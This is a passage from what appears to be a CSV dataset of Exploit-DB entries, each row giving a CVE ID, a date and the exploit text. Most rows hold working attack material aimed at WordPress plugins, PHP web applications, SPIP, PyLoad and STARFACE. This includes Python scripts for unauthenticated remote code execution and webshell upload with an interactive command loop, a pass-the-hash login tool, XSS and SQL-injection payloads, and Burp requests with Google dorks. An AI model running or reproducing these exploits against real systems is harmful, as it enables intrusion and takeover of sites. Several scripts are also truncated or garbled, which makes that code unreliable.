strlen(username)); write(sock, ""\r\n"", 2); read(sock, NULL, 0); write(sock, password, strlen(password)); write(sock, ""\r\n"", 2); sleep(1); pid1 = fork(); if (pid1 == 0) execv(""/usr/bin/ssh"", argv); exit(0); pid2 = fork(); if (pid2 == 0) execl(""/usr/sbin/sshd"", ""/usr/sbin/sshd"", ""-p"", ""2222"", ""-o"", ""StrictModes=no"", ""-o"", ""PasswordAuthentication=no"", ""-o"", ""PubkeyAuthentication=yes"", ""-o"", ""AuthorizedKeysFile=/dev/null"", ""-o"", ""HostKey=/path/to/private/key"", NULL); exit(0); sleep(1); pid1 = fork(); if (pid1 == 0) forward_data(sock, STDIN_FILENO); exit(0); pid2 = fork(); if (pid2 == 0) forward_data(STDOUT_FILENO, sock); exit(0); waitpid(pid1, NULL, 0); waitpid(pid2, NULL, 0); close(sock); return 0;"
CVE-2023-3320,2023-06-20,exploit db,"# Exploit Title: WP Sticky Social 1.0.1 - Cross-Site Request Forgery to Stored Cross-Site Scripting (XSS) # Dork: inurl:~/admin/views/admin.php # Date: 2023-06-20 # Exploit Author: Amirhossein Bahramizadeh # Category : Webapps # Vendor Homepage: https://wordpress.org/plugins/wp-sticky-social # Version: 1.0.1 (REQUIRED) # Tested on: Windows/Linux # CVE : CVE-2023-3320 import requests import hashlib import time # Set the target URL url = ""http://example.com/wp-admin/admin.php?page=wpss_settings"" # Set the user agent string user_agent = ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"" # Generate the nonce value nonce = hashlib.sha256(str(time.time()).encode('utf-8')).hexdigest() # Set the data payload payload = { ""wpss_nonce"": nonce, ""wpss_setting_1"": ""value_1"", ""wpss_setting_2"": ""value_2"", # Add additional settings as needed # Set the request headers headers = { ""User-Agent"": user_agent, ""Referer"": url, ""Cookie"": ""wordpress_logged_in=1; wp-settings-1=editor%3Dtinymce%26libraryContent%3Dbrowse%26uploader%3Dwp-plupload%26urlbutton%3Dfile; wp-settings-time-1=1495271983"", # Add additional headers as needed # Send the POST request response = requests.post(url, data=payload, headers=headers) # Check the response status code if response.status_code == 200: print(""Request successful"") else: print(""Request failed"")"
CVE-2023-2779,2023-06-20,exploit db,"# Exploit Title: Super Socializer 7.13.52 - Reflected XSS # Dork: inurl: https://example.com/wp-admin/admin-ajax.php?action=the_champ_sharing_count&urls[%3Cimg%20src%3Dx%20onerror%3Dalert%28document%2Edomain%29%3E]=https://www.google.com # Date: 2023-06-20 # Exploit Author: Amirhossein Bahramizadeh # Category : Webapps # Vendor Homepage: https://wordpress.org/plugins/super-socializer # Version: 7.13.52 (REQUIRED) # Tested on: Windows/Linux # CVE : CVE-2023-2779 import requests # The URL of the vulnerable AJAX endpoint url = ""https://example.com/wp-admin/admin-ajax.php"" # The vulnerable parameter that is not properly sanitized and escaped vulnerable_param = "" "" # The payload that exploits the vulnerability payload = {""action"": ""the_champ_sharing_count"", ""urls["" + vulnerable_param + ""]"": ""https://www.google.com""} # Send a POST request to the vulnerable endpoint with the payload response = requests.post(url, data=payload) # Check if the payload was executed by searching for the injected script tag if "" "" in response.text: print(""Vulnerability successfully exploited"") else: print(""Vulnerability not exploitable"")"
CVE-2023-27372,2023-06-20,exploit db,"#!/usr/bin/env python3 # -*- coding: utf-8 -*- # Exploit Title: SPIP v4.2.1 - Remote Code Execution (Unauthenticated) # Google Dork: inurl:""/spip.php?page=login"" # Date: 19/06/2023 # Exploit Author: nuts7 (https://github.com/nuts7/CVE-2023-27372) # Vendor Homepage: https://www.spip.net/ # Software Link: https://files.spip.net/spip/archives/ # Version: < 4.2.1 (Except few fixed versions indicated in the description) # Tested on: Ubuntu 20.04.3 LTS, SPIP 4.0.0 # CVE reference : CVE-2023-27372 (coiffeur) # CVSS : 9.8 (Critical) # Vulnerability Description: # SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1. # This"
CVE-2023-33580,2023-06-19,exploit db,"# Exploit Title: Student Study Center Management System v1.0 - Stored Cross-Site Scripting (XSS) # Date of found: 12/05/2023 # Exploit Author: VIVEK CHOUDHARY @sudovivek # Version: V1.0 # Tested on: Windows 10 # Vendor Homepage: https://phpgurukul.com # Software Link: https://phpgurukul.com/student-study-center-management-system-using-php-and-mysql/ # CVE: CVE-2023-33580 # CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33580 Vulnerability Description - The Student Study Center Management System V1.0, developed by PHPGurukul, is susceptible to a critical security vulnerability known as Stored Cross-Site Scripting (XSS). This vulnerability enables attackers to inject malicious JavaScript code, which is then stored and executed by the application. The underlying issue lies in the system's failure to adequately sanitize and validate user-provided input within the ""Admin Name"" field on the Admin Profile page, thereby allowing attackers to inject arbitrary JavaScript code. Steps to Reproduce - The following steps demonstrate how to exploit the Stored XSS vulnerability in the Student Study Center Management System V1.0: 1. Visit the Student Study Center Management System V1.0 application by accessing the URL: http://localhost/student-study-center-MS-PHP/sscms/index.php. 2. Click on the ""Admin"" button to navigate to the admin login page. 3. Login to the Admin account using the default credentials. - Username: admin - Password: Test@123 4. Proceed to the Admin Profile page. 5. Within the ""Admin Name"" field, inject the following XSS payload, enclosed in brackets: {""> }. 6. Click on the ""Submit"" button. 7. Refresh the page, and the injected payload will be executed. As a result of successful exploitation, the injected JavaScript code will be stored in the application's database. Subsequently, whenever another user accesses the affected page, the injected code will execute, triggering an alert displaying the text ""XSS."" This allows the attacker to execute arbitrary code within the user's browser, potentially leading to further attacks or unauthorized actions."
CVE-2023-23956,2023-06-19,exploit db,"Exploit Title: Symantec SiteMinder WebAgent v12.52 - Cross-site scripting (XSS) Google Dork: N/A Date: 18-06-2023 Exploit Author: Harshit Joshi Vendor Homepage: https://community.broadcom.com/home Software Link: https://www.broadcom.com/products/identity/siteminder Version: 12.52 Tested on: Linux, Windows CVE: CVE-2023-23956 Security Advisory: https://support.broadcom.com/external/content/SecurityAdvisories/0/22221 *Description:* I am writing to report two XSS vulnerabilities (CVE-2023-23956) that I have discovered in the Symantec SiteMinder WebAgent. The vulnerability is related to the improper handling of user input and has been assigned the Common Weakness Enumeration (CWE) code CWE-79. The CVSSv3 score for this vulnerability is 5.4. Vulnerability Details: *Impact:* This vulnerability allows an attacker to execute arbitrary JavaScript code in the context of the affected application. *Steps to Reproduce:* *First:* 1) Visit - https://domain.com/siteminderagent/forms/login.fcc?TYPE=xyz&REALMOID=123&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=-SM-%2F%22%20onfocus%3D%22alert%281%29%22%20autofocus%3D%22 2) After visiting the above URL, click on the ""*Change Password*"" button, and the popup will appear. - The *SMAGENTNAME *parameter is the source of this vulnerability. *- Payload Used: **-SM-/"" onfocus=""alert(1)"" autofocus=""* *Second:* 1) Visit - https://domain.com/siteminderagent/forms/login.fcc?TYPE=123&TARGET=-SM-%2F%22%20onfocus%3D%22alert%281%29%22%20autofocus%3D%22 2) After visiting the above URL, click on the ""*Change Password*"" button, and the popup will appear. - The *TARGET *parameter is the source of this vulnerability. *- Payload Used: **-SM-/"" onfocus=""alert(1)"" autofocus=""*"
CVE-2020-11027,2023-06-19,exploit db,"# Exploit Title: WordPress Theme Medic v1.0.0 - Weak Password Recovery Mechanism for Forgotten Password # Dork: inurl:/wp-includes/class-wp-query.php # Date: 2023-06-19 # Exploit Author: Amirhossein Bahramizadeh # Category : Webapps # Vendor Homepage: https://www.templatemonster.com/wordpress-themes/medic-health-and-medical-clinic-wordpress-theme-216233.html # Version: 1.0.0 (REQUIRED) # Tested on: Windows/Linux # CVE: CVE-2020-11027 import requests from bs4 import BeautifulSoup from datetime import datetime, timedelta # Set the WordPress site URL and the user email address site_url = 'https://example.com' user_email = 'user@example.com' # Get the password reset link from the user email # You can use any email client or library to retrieve the email # In this example, we are assuming that the email is stored in a file named 'password_reset_email.html' with open('password_reset_email.html', 'r') as f: email = f.read() soup = BeautifulSoup(email, 'html.parser') reset_link = soup.find('a', href=True)['href'] print(f'Reset Link: {reset_link}') # Check if the password reset link expires upon changing the user password response = requests.get(reset_link) if response.status_code == 200: # Get the expiration date from the reset link HTML soup = BeautifulSoup(response.text, 'html.parser') expiration_date_str = soup.find('p', string=lambda s: 'Password reset link will expire on' in s).text.split('on ')[1] expiration_date = datetime.strptime(expiration_date_str, '%B %d, %Y %I:%M %p') print(f'Expiration Date: {expiration_date}') # Check if the expiration date is less than 24 hours from now if expiration_date < datetime.now() + timedelta(hours=24): print('Password reset link expires upon changing the user password.') else: print('Password reset link does not expire upon changing the user password.') else: print(f'Error fetching reset link: {response.status_code} {response.text}') exit()"
CVE-2023-0297,2023-06-14,exploit db,"# Exploit Title: PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE) # Date: 06-10-2023 # Credits: bAu @bauh0lz # Exploit Author: Gabriel Lima (0xGabe) # Vendor Homepage: https://pyload.net/ # Software Link: https://github.com/pyload/pyload # Version: 0.5.0 # Tested on: Ubuntu 20.04.6 # CVE: CVE-2023-0297 import requests, argparse parser = argparse.ArgumentParser() parser.add_argument('-u', action='store', dest='url', required=True, help='Target url.') parser.add_argument('-c', action='store', dest='cmd', required=True, help='Command to execute.') arguments = parser.parse_args() def doRequest(url): try: res = requests.get(url + '/flash/addcrypted2') if res.status_code == 200: return True else: return False except requests.exceptions.RequestException as e: print(""[!] Maybe the host is offline :"", e) exit() def runExploit(url, cmd): endpoint = url + '/flash/addcrypted2' if "" "" in cmd: validCommand = cmd.replace("" "", ""%20"") else: validCommand = cmd payload = 'jk=pyimport%20os;os.system(""'+validCommand+'"");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' test = requests.post(endpoint, headers={'Content-type': 'application/x-www-form-urlencoded'},data=payload) print('[+] The exploit has be executeded in target machine. ') def main(targetUrl, Command): print('[+] Check if target host is alive: ' + targetUrl) alive = doRequest(targetUrl) if alive == True: print(""[+] Host up, let's exploit! "") runExploit(targetUrl,Command) else: print('[-] Host down! ') if(arguments.url != None and arguments.cmd != None): targetUrl = arguments.url Command = arguments.cmd main(targetUrl, Command)"
CVE-2023-3187,2023-06-13,exploit db,"Exploit Title: Teachers Record Management System 1.0 – File Upload Type Validation Date: 17-01-2023 EXPLOIT-AUTHOR: AFFAN AHMED Vendor Homepage: Software Link: Version: 1.0 Tested on: Windows 11 + XAMPP CVE : CVE-2023-3187 STEPS_TO_REPRODUCE 1. Login into Teacher-Account with the credentials “Username: jogoe12@yourdomain.com” Password: Test@123” 2. Navigate to Profile Section and edit the Profile Pic by clicking on Edit Image 3. Open the Burp-suite and Intercept the Edit Image Request 4. In POST Request Change the “ Filename “ from “ profile picture.png “ to “profile picture.php.gif ” 5. Change the **Content-type from “ image/png “ to “ image/gif “ 6. And Add this **Payload** : `GIF89a ` 7. Where **GIF89a is the GIF magic bytes this bypass the file upload extension** 8. Below is the Burpsuite-POST Request for all the changes that I have made above BURPSUITE_REQUEST POST /trms/teacher/changeimage.php HTTP/1.1 Host: localhost Content-Length: 442 Cache-Control: max-age=0 sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99"" sec-ch-ua-mobile: ?0 sec-ch-ua-platform: ""Windows"" Upgrade-Insecure-Requests: 1 Origin: Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryndAPYa0GGOxSUHdF User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: PHPSESSID=8alf0rbfjmhm3ddra7si0cv7qc Connection: close ------WebKitFormBoundaryndAPYa0GGOxSUHdF Content-Disposition: form-data; name=""subjects"" John Doe ------WebKitFormBoundaryndAPYa0GGOxSUHdF Content-Disposition: form-data; name=""newpic""; filename=""profile picture.php.gif"" Content-Type: image/gif GIF89a ------WebKitFormBoundaryndAPYa0GGOxSUHdF Content-Disposition: form-data; name=""submit"" ------WebKitFormBoundaryndAPYa0GGOxSUHdF-- PROOF_OF_CONCEPT GITHUB_LINK: https://github.com/ctflearner/Vulnerability/blob/main/Teacher_Record_Management_System/trms.md"
CVE-2023-3184,2023-06-13,exploit db,"Exploit Title: Sales Tracker Management System v1.0 – Multiple Vulnerabilities Google Dork: NA Date: 09-06-2023 EXPLOIT-AUTHOR: AFFAN AHMED Vendor Homepage: Software Link: Version: 1.0 Tested on: Windows 11 + XAMPP CVE : CVE-2023-3184 CREDENTIAL TO USE ADMIN-ACCOUNT USERNAME: admin PASSWORD: admin123 PAYLOAD_USED 1. CLICK_HERE_FOR_FIRSTNAME 2. CLICK_HERE_FOR_MIDDLENAME 3. CLICK_HERE_FOR_LASTNAME 4. CLICK_HERE_FOR_USERNAME =============================== STEPS_TO_REPRODUCE 1. FIRST LOGIN INTO YOUR ACCOUNT BY USING THE GIVEN CREDENTIALS OF ADMIN 2. THEN NAVIGATE TO USER_LIST AND CLCIK ON `CREATE NEW` BUTTON OR VISIT TO THIS URL:`http://localhost/php-sts/admin/?page=user/manage_user` 3. THEN FILL UP THE DETAILS AND PUT THE ABOVE PAYLOAD IN `firstname` `middlename` `lastname` and in `username` 4. AFTER ENTERING THE PAYLOAD CLICK ON SAVE BUTTON 5. AFTER SAVING THE FORM YOU WILL BE REDIRECTED TO ADMIN SITE WHERE YOU CAN SEE THAT NEW USER IS ADDED . 6. AFTER CLICKING ON THE EACH PAYLOAD IT REDIRECT ME TO EVIL SITE BURPSUITE_REQUEST POST /php-sts/classes/Users.php?f=save HTTP/1.1 Host: localhost Content-Length: 1037 sec-ch-ua: Accept: */* Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7hwjNQW3mptDFOwo X-Requested-With: XMLHttpRequest sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36 sec-ch-ua-platform: """" Origin: http://localhost Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://localhost/php-sts/admin/?page=user/manage_user Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: PHPSESSID=r0ejggs25qnlkf9funj44b1pbn Connection: close ------WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""id"" ------WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""firstname"" CLICK_HERE_FOR_FIRSTNAME ------WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""middlename"" CLICK_HERE_FOR_MIDDLENAME ------WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""lastname"" CLICK_HERE_FOR_LASTNAME ------WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""username"" CLICK_HERE_FOR_USERNAME ------WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""password"" 1234 ------WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""type"" 2 ------WebKitFormBoundary7hwjNQW3mptDFOwo Content-Disposition: form-data; name=""img""; filename="""" Content-Type: application/octet-stream ------WebKitFormBoundary7hwjNQW3mptDFOwo-- PROOF_OF_CONCEPT GITHUB_LINK: https://github.com/ctflearner/Vulnerability/blob/main/Sales_Tracker_Management_System/stms.md"
CVE-2023-34096,2023-06-09,exploit db,# Exploit Title: Thruk Monitoring Web Interface 3.06 - Path Traversal # Date: 08-Jun-2023 # Exploit Author: Galoget Latorre (@galoget) # CVE: CVE-2023-34096 (Galoget Latorre) # Vendor Homepage: https://thruk.org/ # Software Link: https://github.com/sni/Thruk/archive/refs/tags/v3.06.zip # Software Link + Exploit +
CVE-2021-24499,2023-06-09,exploit db,"# Exploit Title: WordPress Theme Workreap 2.2.2 - Unauthenticated Upload Leading to Remote Code Execution # Dork: inurl:/wp-content/themes/workreap/ # Date: 2023-06-01 # Category : Webapps # Vendor Homepage: https://themeforest.net/item/workreap-freelance-marketplace-wordpress-theme/23712454 # Exploit Author: Mohammad Hossein Khanaki(Mr_B0hl00l) # Version: 2.2.2 # Tested on: Windows/Linux # CVE: CVE-2021-24499 import requests import random import string import sys def usage(): banner = ''' NAME: WordPress Theme Workreap 2.2.2 - Unauthenticated Upload Leading to Remote Code Execution usage: python3 Workreap_rce.py example for linux : python3 Workreap_rce.py https://www.exploit-db.com example for Windows : python Workreap_rce.py https://www.exploit-db.com print(f""{BOLD}{banner}{ENDC}"") def upload_file(target): print(""[ ] Uploading File"") url = target + ""/wp-admin/admin-ajax.php"" body = "" "" data = {""action"": ""workreap_award_temp_file_uploader""} response = requests.post(url, data=data, files={""award_img"": (file_name, body)}) if '{""type"":""success"",' in response.text: print(f""{GREEN}[+] File uploaded successfully{ENDC}"") check_php_file(target) else: print(f""{RED}[+] File was not uploaded{ENDC}"") def check_php_file(target): response_2 = requests.get(target + ""/wp-content/uploads/workreap-temp/"" + file_name) if random_str in response_2.text: print(f""{GREEN}The uploaded PHP file executed successfully.{ENDC}"") print(""path: "" + target +""/wp-content/uploads/workreap-temp/"" + file_name) question = input(f""{YELLOW}Do you want get RCE? [Y/n] {ENDC}"") if question == ""y"" or question == ""Y"": print(""[ ] Uploading Shell "") get_rce(target) else: usage() else: print(f""{RED}[+] PHP file not allowed on this website. Try uploading another file.{ENDC}"") def get_rce(target): file_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + "".php"" body = ' \n$output "";?>' data = {""action"": ""workreap_award_temp_file_uploader""} response_3 = requests.post(target + '/wp-admin/admin-ajax.php', data=data, files={""award_img"": (file_name, body)}) print(f""{GREEN}[+] Shell uploaded successfully{ENDC}"") while True: command = input(f""{YELLOW}Enter a command to execute: {ENDC}"") print(f""Shell Path : {target}'/wp-content/uploads/workreap-temp/{BOLD}{file_name}?c={command}{ENDC}"") response_4 = requests.get(target + '/wp-content/uploads/workreap-temp/' + file_name + f""?c={command}"") print(f""{GREEN}{response_4.text}{ENDC}"") if __name__ == ""__main__"": global GREEN , RED, YELLOW, BOLD, ENDC GREEN = '\033[92m' RED = '\033[91m' YELLOW = '\033[93m' BOLD = '\033[1m' ENDC = '\033[0m' file_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + "".php"" random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) try: upload_file(sys.argv[1]) except IndexError: usage() except requests.exceptions.RequestException as e: print(""\nPlease Enter Valid Address"")"
CVE-2023-30868,2023-06-06,exploit db,"# Exploit Title: Tree Page View Plugin 1.6.7 - Cross Site Scripting (XSS) # Google Dork: inurl:/wp-content/plugins/cms-tree-page-view/ # Date: 2023-04-24 # Exploit Author: LEE SE HYOUNG (hackintoanetwork) # Vendor Homepage: https://wordpress.org/plugins/cms-tree-page-view/ # Software Link: https://downloads.wordpress.org/plugin/cms-tree-page-view.1.6.6.zip # Category: Web Application # Version: 1.6.7 # Tested on: Debian / WordPress 6.1.1 # CVE : CVE-2023-30868 # Reference: https://patchstack.com/database/vulnerability/cms-tree-page-view/wordpress-cms-tree-page-view-plugin-1-6-7-cross-site-scripting-xss-vulnerability?_s_id=cve # 1. Technical Description: The CMS Tree Page View plugin for WordPress has a Reflected Cross-Site Scripting vulnerability up to version 1.6.7. This is due to the post_type parameter not properly escaping user input. As a result, users with administrator privileges or higher can inject JavaScript code that will execute whenever accessed. # 2. Proof of Concept ("
CVE-2023-33584,2023-06-04,exploit db,"# Exploit Title: Enrollment System Project v1.0 - SQL Injection Authentication Bypass (SQLI) # Date of found: 18/05/2023 # Exploit Author: VIVEK CHOUDHARY @sudovivek # Version: V1.0 # Tested on: Windows 10 # Vendor Homepage: https://www.sourcecodester.com # Software Link: https://www.sourcecodester.com/php/14444/enrollment-system-project-source-code-using-phpmysql.html # CVE: CVE-2023-33584 # CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33584 Vulnerability Description - Enrollment System Project V1.0, developed by Sourcecodester, has been found to be vulnerable to SQL Injection (SQLI) attacks. This vulnerability allows an attacker to manipulate the SQL queries executed by the application. The system fails to properly validate user-supplied input in the username and password fields during the login process, enabling an attacker to inject malicious SQL code. By exploiting this vulnerability, an attacker can bypass authentication and gain unauthorized access to the system. Steps to Reproduce - The following steps outline the exploitation of the SQL Injection vulnerability in Enrollment System Project V1.0: 1. Launch the Enrollment System Project V1.0 application. 2. Open the login page by accessing the URL: http://localhost/enrollment/login.php. 3. In the username and password fields, insert the following SQL Injection payload shown inside brackets to bypass authentication: {' or 1=1 #}. 4. Click the login button to execute the SQL Injection payload. As a result of successful exploitation, the attacker gains unauthorized access to the system and is logged in with administrative privileges."
CVE-2023-33243,2023-06-04,exploit db,"Exploit Title: STARFACE 7.3.0.10 - Authentication with Password Hash Possible Affected Versions: 7.3.0.10 and earlier versions Fixed Versions: - Vulnerability Type: Broken Authentication Security Risk: low Vendor URL: https://www.starface.de Vendor Status: notified Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2022-004 Advisory Status: published CVE: CVE-2023-33243 CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33243 Introduction ""When functionality and comfort come together, the result is a state-of-the-art experience that we've dubbed 'comfortphoning'. It's a secure, scalable digital communication solution that meets every need and wish. STARFACE is easy to integrate into existing IT systems and flexibly grows with your requirements."" (from the vendor's homepage) More Details The image of STARFACE PBX [0] in version 7.3.0.10 can be downloaded from the vendor's homepage [1]. The included files can be further examined by either extracting the contents or running the image in a virtual machine. The web interface of the PBX uses the JavaScript file at the following path to submit the login form: js/prettifier.js The following two lines of the JavaScript file ""prettifier.js"" add the two parameters ""secret"" and ""ack"" to the form before being submitted: $form(document.forms[0]).add('secret', createHash(defaultVals.isAd, liv, lpv, defaultVals.k + defaultVals.bk)); $form(document.forms[0]).add('ack', defaultVals.k); The JavaScript object ""defaultVals"" is included in the web application's source text. While the value of ""defaultVals.k"" was found to be the static hash of the PBX version, the value of ""defaultVals.bk"" contains a nonce only valid for the currently used session. Therefore, the form parameter ""ack"" is always the same value. For the form value ""secret"" the function ""createHash()"" is called with different arguments. The value of ""defaultVals.isAd"" is set to ""false"" when login via Active Directory is disabled. The parameters ""liv"" and ""lpv"" contain the username and password entered into the form respectively. const createHash = function (isAD, user, pass, nonces) { if (isAD) { return forAD.encode(user + nonces + pass); return user + ':' + forSF(user + nonces + forSF(pass)); The expression right after the second return statement is the implementation used when Active Directory login is disabled which is the default setting. The return value is composed of the username separated via a colon from a value built using the ""forSF()"" function. The ""forSF()"" function was found to calculate the SHA512 hash value. When considering the arguments passed to the function, the hash is calculated as follows: SHA512(username + defaultVals.k + defaultVals.bk + SHA512(password)) As can be seen, instead of the cleartext password the SHA512 hash of the password is used in the calculation. In conclusion, for the form value ""secret"" the following value is transmitted: username + "":"" + SHA512( username + defaultVals.k + defaultVals.bk + SHA512(password) If the SHA512 hash of a user's password is known, it can be directly used in the calculation of the ""secret"" during the login process. Knowledge of the cleartext password is not required. This finding was also verified by analysing the decompiled Java code of the server component. It was also found that the authentication process of the REST API is vulnerable in a very similar manner. Proof of Concept The following Python script can be used to perform a login by specifying a target URL, a username and the associated password hash: #!/usr/bin/env python3 import click import hashlib import re import requests import typing def get_values_from_session(url, session) -> typing.Tuple[str, str]: k, bk = """", """" response_content = session.get(f""{url}/jsp/index.jsp"").text k_result = re.search(""\sk : '([^']+)'"", response_content) bk_result = re.search(""\sbk : '([^']+)'"", response_content) if k_result != None: k = k_result.group(1) if bk_result != None: bk = bk_result.group(1) return k, bk def web_login(url, login, pwhash, session) -> bool: version, nonce = get_values_from_session(url, session) if version == """" or nonce == """": print(""Web Login failed: Nonce and version hash can not be retrieved."") return value = login + version + nonce + pwhash secret = hashlib.sha512(value.encode(""utf-8"")).hexdigest() data = { ""forward"": """", ""autologin"": ""false"", ""secret"": f""{login}:{secret}"", ""ack"": version, login_request = session.post( f""{url}/login"", data=data, allow_redirects=False, headers={""Referer"": f""{url}/jsp/index.jsp""}, response_headers = login_request.headers if ""Set-Cookie"" in response_headers: session_id = response_headers[""Set-Cookie""].split(""="")[1].split("";"")[0] print(f""Session ID: {session_id}"") return True else: print(""Invalid login data"") return False def get_nonce_from_api(url, session) -> str: response_content = session.get(f""{url}/rest/login"").json() return response_content[""nonce""] if ""nonce"" in response_content else """" def rest_login(url, login, pwhash, session): nonce = get_nonce_from_api(url, session) if nonce == """": print(""REST Login failed: Nonce can not be retrieved."") return value = login + nonce + pwhash secret = hashlib.sha512(value.encode(""utf-8"")).hexdigest() data = {""loginType"": ""Internal"", ""nonce"": nonce, ""secret"": f""{login}:{secret}""} login_request = session.post( f""{url}/rest/login"", json=data, headers={""Content-Type"": ""application/json"", ""X-Version"": ""2""}, response_data = login_request.json() token = response_data[""token""] if ""token"" in response_data else ""none"" print(f""REST API Token: {token}"") @click.command() @click.option('--url', help='Target System URL', required=True) @click.option('--login', help='Login ID', required=True) @click.option('--pwhash', help='Password Hash', required=True) def login(url, login, pwhash): session = requests.session() stripped_url = url.rstrip(""/"") result = web_login(stripped_url, login, pwhash, session) if result: rest_login(stripped_url, login, pwhash, session) if __name__ == ""__main__"": login() For example, the SHA512 hash of the password ""starface"" can be calculated as follows: $ echo -n ""starface"" | sha512sum a37542915e834f6e446137d759cdcb825a054d0baab73fd8db695fc49529bc8e52eb27979dd1dcc21849567bac74180f6511121f76f4a2a1f196670b7375f8ec - The Python script can be run as follows to perform a login as the user ""0001"" with the aforementioned hash: $ python3 login.py --url 'https://www.example.com' --login 0001 --pwhash 'a37542915e834f6e446137d759cdcb825a054d0baab73fd8db695fc49529bc8e52eb27979dd1dcc21849567bac74180f6511121f76f4a2a1f196670b7375f8ec' Session ID: 2CF09656E274F000FFAD023AF37629CE REST API Token: 51eef8f8vp3d3u81k0imjbuuu7 When the password hash is valid for the specified user of the targeted instance a session ID as well as a REST API token is returned. Afterwards, these values can be used to interact with the web application and the REST API. Workaround None Fix On 4 May 2023, version 8.0.0.11 was released. In this version the vulnerability was addressed with a temporary solution, such that the password hashes are encrypted before they are saved in the database. This approach prevents attackers from exploiting this vulnerability in scenarios where they have only acquired pure database access. However, attackers with system level access can bypass this temporary measure as they can extract the encryption key and decrypt the hashes in the database. A solution that fixes this vulnerability entirely is still in progress. Security Risk The web interface and REST API of STARFACE allow to login using the password hash instead of the cleartext password. This can be exploited by attackers who gained access to the application's database where the passwords are also saved as a SHA512 hash of the cleartext passwords. While the precondition for this attack could be the full compromise of the STARFACE PBX, another attack scenario could be that attackers acquire access to backups of the database stored on another system. Furthermore, the login via password hash allows attackers for permanent unauthorised access to the web interface even if system access was obtained only temporarily. Due to the prerequisites of obtaining access to password hashes, the vulnerability poses a low risk only. Timeline 2022-12-06 Vulnerability identified 2022-12-13 Customer approved disclosure to vendor 2023-01-11 Vendor notified 2023-05-04 Vendor released new version 8.0.0.11 2023-05-19 CVE ID requested 2023-05-20 CVE ID assigned 2023-06-01 Advisory released References [0] https://starface.com/en/products/comfortphoning/ [1] https://knowledge.starface.de/pages/viewpage.action?pageId=46564694 RedTeam Pentesting GmbH RedTeam Pentesting offers individual penetration tests performed by a team of specialised IT-security experts. Hereby, security weaknesses in company networks or products are uncovered and can be fixed immediately. As there are only few experts in this field, RedTeam Pentesting wants to share its knowledge and enhance the public knowledge with research in security-related areas. The results are made available as public security advisories. More information about RedTeam Pentesting can be found at: https://www.redteam-pentesting.de/ Working at RedTeam Pentesting RedTeam Pentesting is looking for penetration testers to join our team in Aachen, Germany. If you are interested please visit: https://jobs.redteam-pentesting.de/ RedTeam Pentesting GmbH Tel.: +49 241 510081-0 Alter Posthof 1 Fax : +49 241 510081-99 52062 Aachen https://www.redteam-pentesting.de Germany Registergericht: Aachen HRB 14004 Geschäftsführer: Patrick Hof, Jens Liebchen"
CVE-2023-2068,2023-06-04,exploit db,"# Exploit Title: File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution (RCE) # Date: 05/31/2023 # Exploit Author: Mateus Machado Tesser # Vendor Homepage: https://advancedfilemanager.com/ # Version: File Manager Advanced Shortcode 2.3.2 # Tested on: Wordpress 6.1 / Linux (Ubuntu) 5.15 # CVE: CVE-2023-2068 import requests import json import pprint import sys import re PROCESS = ""\033[1;34;40m[*]\033[0m"" SUCCESS = ""\033[1;32;40m[+]\033[0m"" FAIL = ""\033[1;31;40m[-]\033[0m"" try: COMMAND = sys.argv[2] IP = sys.argv[1] if len(COMMAND) > 1: pass if IP: pass else: print(f'Use: {sys.argv[0]} IP COMMAND') except: pass url = 'http://'+IP+'/' # Path to File Manager Advanced Shortcode Panel print(f""{PROCESS} Searching fmakey"") try: r = requests.get(url) raw_fmakey = r.text fmakey = re.findall('_fmakey.*$',raw_fmakey,re.MULTILINE)[0].split(""'"")[1] if len(fmakey) == 0: print(f""{FAIL} Cannot found fmakey!"") except: print(f""{FAIL} Cannot found fmakey!"") print(f'{PROCESS} Exploiting Unauthenticated Remote Code Execution via AJAX!') url = ""http://""+IP+""/wp-admin/admin-ajax.php"" headers = {""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"", ""Content-Type"": ""multipart/form-data; 